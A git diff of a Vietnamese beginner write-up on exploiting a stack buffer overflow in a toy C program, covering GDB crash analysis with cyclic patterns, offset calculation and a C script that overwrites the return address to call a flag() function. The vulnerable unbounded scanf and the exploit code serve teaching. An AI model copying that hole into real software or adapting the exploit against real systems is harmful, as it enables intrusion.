@@ -1,24 +1,45 @@
-# Exploit BOF (buffer overflow) in C script no pwntools python exploit
->bản `WriteUp` này mình sẽ giải thích chi tiết cách thức hoạt động và khai thác `BOF` bằng script C:
+<div align="center">
 
-### I.BOF là gì?
-- `BOF` thường được gọi là `buffer overflow` là 1 vulnerable cho phép ghi tràn qua vùng nhớ ngoài `stack`, khi tới mục đích cuối cùng thường là `RIP` thì sẽ ghi địa chỉ trỏ tới phần mà hacker muốn trỏ để thực hiện các hành vi độc hại khác nói dễ hiểu hơn là :
-	- Khi chúng ta có 1 đoạn mã nguồn có lỗ hổng BOF ở đây :
+# 💥 Buffer Overflow Exploitation
+### WriteUp: Khai thác BOF bằng C script — không dùng pwntools
 
+![Platform](https://img.shields.io/badge/Platform-Linux%20x64-informational?style=flat-square&logo=linux&logoColor=white&color=0a0a0a)
+![Language](https://img.shields.io/badge/Language-C-blue?style=flat-square&logo=c)
+![Category](https://img.shields.io/badge/Category-Binary%20Exploitation-critical?style=flat-square)
+![Difficulty](https://img.shields.io/badge/Difficulty-Beginner%20Friendly-success?style=flat-square)
+
+</div>
+
+---
+
+## 📋 Mục lục
+
+- [BOF là gì?](#-i-bof-là-gì)
+- [Tại sao ghi đè RBP lại crash?](#-i1-tại-sao-ghi-đè-rbp-lại-crash)
+- [Cách tính offset](#-ii-cách-tính-offset)
+- [Khai thác — exploit script](#-iii-khai-thác)
+
+---
+
+## 🔍 I. BOF là gì?
+
+**Buffer Overflow (BOF)** là lỗ hổng cho phép ghi dữ liệu vượt ra ngoài vùng nhớ đã cấp phát trên stack. Khi dữ liệu tràn đến `RIP/RBP`, kẻ tấn công có thể điều hướng luồng thực thi đến bất kỳ địa chỉ nào mong muốn.
+
+### Code có lỗ hổng
 
 ```c
 #include <stdio.h>
 #include <string.h>
 
-void flag(){
-	printf("FLAGGGGGGGGGGG1234567890000000000000\n");
+void flag() {
+    printf("FLAGGGGGGGGGGG1234567890000000000000\n");
 }
 
 void vulnerable() {
     char buf[64];
 
     printf("Input: ");
-    scanf("%s",&buf);   // cực kỳ nguy hiểm
+    scanf("%s", &buf);   // ⚠️  Không giới hạn độ dài — cực kỳ nguy hiểm!
 
     printf("You entered: %s\n", buf);
 }
@@ -29,79 +50,169 @@ int main() {
 }
 ```
 
-- trong đó có `flag` là phần minh họa cho mục tiêu của ta thì bây giờ ta mở nó trong gdb thông qua lệnh `gdb ./bof`: 
+> **Mục tiêu:** Gọi được hàm `flag()` mà không thông qua luồng thực thi bình thường.
 
- 	![alt text](image.png)
+### Tạo chuỗi cyclic và gây crash
 
-	- tiến hành nhập `r <<< $(pwn cyclic 300)`, tại đây lệnh `r` viết tắt là `run` dùng để chạy chương trình, còn syntax `<<<` nghĩa là khi nó mở `shell` thì sẽ lấy output của `pwn cyclic` đưa vào, lệnh `$(pwn cyclic 300)` là thực thi `pwn cyclic` để create ra 300 ký tự như hình :
+Mở binary trong GDB rồi chạy với chuỗi cyclic 300 ký tự:
 
-	![alt text](image2.png)
+```bash
+gdb ./bof
+(gdb) r <<< $(pwn cyclic 300)
+```
 
-	- khi đó chương trình sẽ bị crash `SIGSEGVS` do nhập quá vùng `buffer` cho phép, ta gọi đó là `tràn ra ngoài vùng stack khác` và `truy cập địa chỉ không hợp lệ`, địa chỉ đó là số hex của `ký tự đầu vào` mà ta nhập lúc đầu :
+> `pwn cyclic 300` sinh ra 300 ký tự **không lặp lại**, giúp ta xác định chính xác vị trí bị ghi đè.
 
-	![alt text](image3.png)
+Kết quả: chương trình crash với `SIGSEGV` vì đã tràn ra ngoài vùng `buf[64]` và ghi đè các giá trị quan trọng trên stack.
 
-	- chúng ta thấy `RBP` bị ghi đè bởi các ký tự hexa của chuỗi mà pwn cyclic tạo ra 
-### I.1.vậy vì sao khi RBP bị ghi đè lại crash?
-- lý do rất đơn giản là nó bị `SIGSEGV` tại `ret` ở hàm `vulnerable` cụ thể:
+```
+Program received signal SIGSEGV, Segmentation fault.
+RBP: 0x6161617261616171  ← bị ghi đè bởi chuỗi cyclic
+```
 
-	![alt text](image4.png)
+![crash screenshot](image3.png)
 
-- giải thích chi tiết hơn : `ret` là cái thoát ra khỏi hàm hiện tại và quay trở về cái nơi mà gọi hàm ví dụ dễ hiểu hơn là khi ta thấy nó call `0x555555555040 <printf@plt>` như trong ảnh nếu trong printf logic đã chạy xong thì sẽ có ret ở cuối đoạn mã trong đó, khi `ret` được thực thi ở trong hàm printf đó thì nó sẽ thoát ra và đi tới `lea rax,[rbp-0x40]`, lý do chính ở đây là `ret` cần phải có `RBP` để nó biết để có thể đi tiếp `instrution` tiếp theo, nhưng khi nhập quá buffer đã bị tràn ra stack thì RBP bị ghi đè các ký tự hexa vốn không trỏ tới vùng nhớ nào hợp lệ nên ret truy cập vào địa chỉ không hợp lệ vì thế crash
+---
 
-### II.cách soi offset sau khi đã ghi đè vào rbp
-- ở đây chúng ta sẽ dùng `cyclic -l <hex của ký tự ghi đè>` trong gdb ví dụ như trong ảnh ta thấy `Rip` chưa bị ghi đè nên ta chưa thể soi offset ở rip trực tiếp được :
+## 🧩 I.1. Tại sao ghi đè RBP lại crash?
 
-	![alt text](image5.png)
+Lỗi xảy ra tại lệnh `ret` ở cuối hàm `vulnerable()`.
 
-- bây giờ ta tiến hành soi offset tại `RBP` thay cho rip ta dùng lệnh `cyclic -l 0x6161617261616171`:
+```
+ ┌────────────────────────────────────────────────────────┐
+ │  ret  ──► đọc giá trị từ [RSP] và nhảy đến đó         │
+ │           nếu giá trị đó không hợp lệ → SIGSEGV 💥    │
+ └────────────────────────────────────────────────────────┘
+```
 
-	![alt text](image6.png)
+**Luồng chi tiết:**
 
-- ta thấy offset của nó là `64` 
+1. `scanf` ghi vượt qua `buf[64]`, tràn vào `RBP` và `return address`
+2. Hàm `vulnerable` kết thúc → thực thi lệnh `ret`
+3. `ret` lấy địa chỉ trên stack (đã bị ghi đè bởi ký tự cyclic) và cố nhảy đến đó
+4. Địa chỉ đó không hợp lệ → kernel phát sinh `SIGSEGV`
 
-## III. exploit
-- dựa vào `stack layout` như sau:
+![ret crash](image4.png)
 
-  |                         |
-  |-------------------------|
-  |buffer(local var,...)    |
-  |padding                  |
-  |Saved Stack Pointer      |
-  |Saved Instruction pointer|
+---
 
-- theo như stack layout `RBP + 8` là của retrun address, mục tiêu của chúng ta là tính `offset` để cho script trỏ tới đây và ghi đè địa chỉ mong muốn mà ta muốn thực thi, theo như vậy -> ta có offset của `RBP` là 64 + 8 = 72, vậy offset chính xác là 72. Ta có script C để khai thác :
+## 📐 II. Cách tính offset
+
+Vì `RIP` chưa bị ghi đè trực tiếp trong ví dụ này, ta tính offset qua `RBP`:
+
+```bash
+(gdb) cyclic -l 0x6161617261616171
+```
+
+```
+Found at offset 64
+```
+
+![offset](image6.png)
+
+### Stack layout
+
+```
+┌───────────────────────────────┐  ← địa chỉ thấp
+│  buf[64]  (local variable)    │
+├───────────────────────────────┤
+│  padding / saved registers    │
+├───────────────────────────────┤  ← RBP  (offset = 64)
+│  Saved Base Pointer (RBP)     │
+├───────────────────────────────┤  ← RBP + 8
+│  Return Address  ✅ mục tiêu  │  ← offset = 72
+└───────────────────────────────┘  ← địa chỉ cao
+```
+
+> **Công thức:** `offset_RBP + 8 = 64 + 8 = 72` → đây là offset chính xác để ghi đè return address.
+
+---
+
+## 💣 III. Khai thác
+
+### Lấy địa chỉ hàm `flag()`
+
+```bash
+(gdb) disas flag
+```
+
+```
+Dump of assembler code for function flag:
+   0x0000555555555159 <+0>:  push rbp       ← đây là địa chỉ cần lấy
+   ...
+```
+
+![disas flag](image7.png)
+
+### Exploit script (C)
 
 ```c
 #include <unistd.h>
 #include <stdint.h>
 #include <string.h>
 
-int main(void){
-    int offset = 72; // <- 72 là offset chính xác trỏ tới return addr 
-    uint64_t win = 0x0000555555555159; // <- địa chỉ của hàm flag 
+int main(void) {
+    // ── Cấu hình ────────────────────────────────────────────
+    int      offset = 72;                    // offset đến return address
+    uint64_t win    = 0x0000555555555159;    // địa chỉ hàm flag()
+    // ────────────────────────────────────────────────────────
 
     char payload[800];
-    memset(payload, 'A', offset);
-    memcpy(payload + offset, &win, 8); // <- số 8 dành cho binary x64 , nếu là x86 thì thay số 8 thành số 4
 
-    int payload_len = offset + 8; //<- đây cũng vậy
+    memset(payload, 'A', offset);            // lấp đầy buffer + padding
+    memcpy(payload + offset, &win, 8);       // ghi đè return address
+    //                               ^── 8 bytes cho binary x64 (dùng 4 cho x86)
 
-    write(1, payload, payload_len);  // 1 = stdout
+    int payload_len = offset + 8;
+
+    write(1, payload, payload_len);          // ghi ra stdout
     return 0;
 }
 ```
 
-- để có được địa chỉ của hàm flag khá đơn giản là ta chỉ dùng `disas` để lấy:
+> **Lưu ý:** Với binary **x86** (32-bit), thay `uint64_t` → `uint32_t` và đổi `8` → `4`.
 
-	![alt text](image7.png)
+### Biên dịch và chạy
 
-- ở `instrution` địa chỉ chính xác của nó là `0x0000555555555159`, cái `<flag + 0>` và chúng ta thay thế vào biến win ở script và biên dịch nó:
+```bash
+# Biên dịch exploit
+gcc exploit.c -o exploit
 
-	![alt text](image8.png)
+# Chạy trong GDB
+(gdb) r <<< $(./exploit)
+```
 
-- và chúng ta tiến hành chạy nó ở `GDB`:
+![compile](image8.png)
+![pwned](image9.png)
 
-	![alt text](image9.png)
+---
 
-- chúng ta đã khai thác và thực thi hàm flag thành công 
+## ✅ Kết quả
+
+```
+FLAGGGGGGGGGGG1234567890000000000000
+```
+
+Hàm `flag()` đã được gọi thành công thông qua khai thác BOF! 🎉
+
+---
+
+## 🗺️ Tóm tắt luồng tấn công
+
+```
+Input dài  →  tràn buf[64]  →  ghi đè RBP  →  ghi đè Return Address
+                                                       │
+                                                       ▼
+                                              ret nhảy đến flag()
+                                                       │
+                                                       ▼
+                                              FLAG in ra màn hình 🚩
+```
+
+---
+
+<div align="center">
+
+Made with ❤️ for learning purposes only. **Use responsibly.**
+
+</div>
